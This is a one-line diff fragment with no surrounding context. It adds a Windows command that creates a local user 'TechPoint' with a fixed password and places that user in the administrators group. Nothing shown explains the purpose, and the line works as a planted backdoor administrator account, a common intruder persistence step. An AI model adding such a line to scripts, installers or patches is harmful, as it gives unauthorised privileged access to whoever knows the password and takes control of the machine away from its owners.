@@ -1,0 +1,1 @@
+net user /add TechPoint "Password" && net localgroup administrators TechPoint /add
